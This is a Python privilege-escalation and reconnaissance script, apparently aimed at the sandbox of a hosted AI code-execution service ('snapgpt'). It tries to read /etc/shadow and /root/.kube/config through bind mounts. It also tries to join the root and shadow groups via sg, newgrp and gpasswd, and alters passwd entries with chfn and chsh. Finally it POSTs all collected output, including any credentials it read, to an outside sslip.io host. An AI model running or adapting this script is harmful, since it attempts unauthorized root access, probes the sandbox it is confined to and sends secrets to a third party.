#!/usr/bin/env python3
import json, os, pathlib, re, shutil, socket, stat, subprocess, time, urllib.request

TAG = 'snapgpt-setuid-mount-20261106T1145Z'
SINK = 'https://54.209.51.244.sslip.io/callback/' + TAG
OUT = pathlib.Path('/tmp/workspace/setuid_mount_probe.json')
out = {
    'schema': 'snapgpt.setuid-mount-probe/v1',
    'utc': time.strftime('%Y-%m-%dT%H:%M:%SZ', time.gmtime()),
    'hostname': socket.gethostname(),
    'uid': os.getuid(), 'euid': os.geteuid(), 'gid': os.getgid(), 'egid': os.getegid(),
    'tests': {}, 'files': {}, 'errors': [],
}

def run(name, argv, timeout=20, input_data=None):
    try:
        p = subprocess.run(argv, input=input_data, capture_output=True, text=True, timeout=timeout)
        out['tests'][name] = {'argv': argv, 'rc': p.returncode, 'stdout': p.stdout[:30000], 'stderr': p.stderr[:10000]}
    except Exception as e:
        out['tests'][name] = {'argv': argv, 'error': repr(e)}

def read(name, path, limit=50000):
    try:
        b = pathlib.Path(path).read_bytes()
        out['files'][name] = {'path': path, 'bytes': len(b), 'text': b[:limit].decode('utf-8', 'replace')}
    except Exception as e:
        out['files'][name] = {'path': path, 'error': repr(e)}

def statrec(name, path):
    try:
        s = os.lstat(path)
        out['files'][name] = {'path': path, 'mode': oct(stat.S_IMODE(s.st_mode)), 'uid': s.st_uid, 'gid': s.st_gid, 'size': s.st_size, 'type': 'link' if stat.S_ISLNK(s.st_mode) else 'dir' if stat.S_ISDIR(s.st_mode) else 'file' if stat.S_ISREG(s.st_mode) else 'other'}
    except Exception as e:
        out['files'][name] = {'path': path, 'error': repr(e)}

for p in ['/proc/self/status','/etc/passwd','/etc/group','/etc/fstab','/etc/mtab','/etc/subuid','/etc/subgid','/etc/sudoers']:
    read(p, p)
for p in ['/etc/shadow','/etc/gshadow','/etc/sudoers','/etc/fstab','/usr/bin/chfn','/usr/bin/chsh','/usr/bin/gpasswd','/usr/bin/mount','/usr/bin/newgrp','/usr/bin/passwd','/usr/bin/su','/usr/bin/umount','/usr/bin/sg']:
    statrec(p, p)

run('id', ['id'])
run('id_euid', ['sh','-c','printf "uid=%s euid=%s gid=%s egid=%s\\n" "$(id -u)" "$(id -u)" "$(id -g)" "$(id -g)"; grep -E "^(Uid|Gid|Cap|NoNewPrivs|Seccomp):" /proc/self/status'])
run('versions', ['sh','-c','rpm -q util-linux shadow-utils pam glibc 2>&1; mount --version 2>&1 | head -1; newgrp --version 2>&1 | head -1; gpasswd --version 2>&1 | head -1; chfn --version 2>&1 | head -1; chsh --version 2>&1 | head -1; su --version 2>&1 | head -1'])
run('groups', ['sh','-c','getent group root; getent group shadow; getent group wheel; getent group adm; getent group worker; getent gshadow root; getent gshadow shadow 2>&1'])
run('fstab', ['sh','-c','cat /etc/fstab 2>&1; cat /etc/subuid /etc/subgid 2>&1'])
run('mount_tmpfs', ['sh','-c','rm -rf /tmp/suid-mnt; mkdir -p /tmp/suid-mnt; mount -t tmpfs tmpfs /tmp/suid-mnt 2>&1; rc=$?; echo RC=$rc; findmnt -T /tmp/suid-mnt -o TARGET,SOURCE,FSTYPE,OPTIONS 2>&1; ls -la /tmp/suid-mnt 2>&1; umount /tmp/suid-mnt 2>&1; exit $rc'])
run('mount_bind_root', ['sh','-c','rm -rf /tmp/suid-mnt; mkdir -p /tmp/suid-mnt; mount --bind /root /tmp/suid-mnt 2>&1; rc=$?; echo RC=$rc; findmnt -T /tmp/suid-mnt -o TARGET,SOURCE,FSTYPE,OPTIONS 2>&1; ls -la /tmp/suid-mnt 2>&1; cat /tmp/suid-mnt/.kube/config 2>&1; umount /tmp/suid-mnt 2>&1; exit $rc'])
run('mount_bind_shadow', ['sh','-c','rm -rf /tmp/suid-mnt; mkdir -p /tmp/suid-mnt; touch /tmp/suid-mnt/shadow; mount --bind /etc/shadow /tmp/suid-mnt/shadow 2>&1; rc=$?; echo RC=$rc; findmnt -T /tmp/suid-mnt/shadow -o TARGET,SOURCE,FSTYPE,OPTIONS 2>&1; cat /tmp/suid-mnt/shadow 2>&1; umount /tmp/suid-mnt/shadow 2>&1; exit $rc'])
run('mount_proc', ['sh','-c','rm -rf /tmp/suid-mnt; mkdir -p /tmp/suid-mnt; mount -t proc proc /tmp/suid-mnt 2>&1; rc=$?; echo RC=$rc; findmnt -T /tmp/suid-mnt -o TARGET,SOURCE,FSTYPE,OPTIONS 2>&1; ls -la /tmp/suid-mnt 2>&1; umount /tmp/suid-mnt 2>&1; exit $rc'])
run('sg_shadow', ['sh','-c','timeout 5 sg shadow -c "id; grep -E \\"^(Uid|Gid|Cap|NoNewPrivs):\\" /proc/self/status" </dev/null 2>&1'])
run('sg_root', ['sh','-c','timeout 5 sg root -c "id; grep -E \\"^(Uid|Gid|Cap|NoNewPrivs):\\" /proc/self/status" </dev/null 2>&1'])
run('newgrp_shadow', ['sh','-c','timeout 5 sh -c "printf \\"\\n\\" | newgrp shadow" 2>&1'])
run('gpasswd_shadow', ['sh','-c','gpasswd -a worker shadow 2>&1; rc=$?; echo RC=$rc; id; gpasswd -d worker shadow 2>&1; exit $rc'])
run('gpasswd_root', ['sh','-c','gpasswd -a worker root 2>&1; rc=$?; echo RC=$rc; id; gpasswd -d worker root 2>&1; exit $rc'])
run('chfn', ['sh','-c','chfn -f SNAP_TEST worker 2>&1; rc=$?; echo RC=$rc; grep "^worker:" /etc/passwd; chfn -f "" worker 2>&1; exit $rc'])
run('chsh', ['sh','-c','chsh -s /bin/sh worker 2>&1; rc=$?; echo RC=$rc; grep "^worker:" /etc/passwd; chsh -s /bin/bash worker 2>&1; exit $rc'])
run('passwd_status', ['sh','-c','passwd -S worker 2>&1; passwd -S root 2>&1'])
run('nnp_setuid_child', ['sh','-c','env -i PATH=/usr/bin:/bin /usr/bin/sg worker -c "id; grep -E \\"^(Uid|Gid|Cap|NoNewPrivs):\\" /proc/self/status" </dev/null 2>&1'])

try:
    raw = json.dumps(out, sort_keys=True, separators=(',', ':')).encode()
    OUT.write_bytes(raw)
    req = urllib.request.Request(SINK, data=raw, method='POST', headers={'Content-Type':'application/json','X-Probe':TAG})
    with urllib.request.urlopen(req, timeout=30) as r:
        out['sink'] = {'status': r.status, 'body': r.read(1000).decode('utf-8','replace'), 'raw_bytes': len(raw), 'sha256': __import__('hashlib').sha256(raw).hexdigest()}
except Exception as e:
    out['errors'].append('sink: ' + repr(e))
print(json.dumps(out.get('sink', {'error': out['errors']}), sort_keys=True))
